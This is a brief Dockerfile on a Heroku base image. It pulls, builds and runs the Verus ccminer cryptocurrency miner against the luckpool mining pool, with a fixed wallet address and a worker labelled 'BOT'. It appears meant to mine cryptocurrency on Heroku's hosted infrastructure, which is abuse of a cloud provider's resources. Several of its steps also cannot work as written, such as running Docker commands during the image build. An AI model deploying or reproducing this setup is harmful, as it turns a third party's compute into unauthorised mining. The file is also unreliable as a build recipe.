FROM heroku/heroku:18
RUN apt-get update
RUN apt-get install -y curl git unzip wget docker
RUN docker pull wattpool/verusccminer
RUN git clone https://github.com/wattpool/verus-ccminer-dockerized.git
RUN cd verus-ccminer-dockerized
RUN docker build -t verusccminer .
RUN docker run --name verusccminer verusccminer -a verus -o stratum+tcp://eu.luckpool.net:3956#xnsub -u RN6MfBAJnpjchdY2L3EnnFQXkFkHzmrNoY.BOT -p x -tX
CMD bash heroku.sh
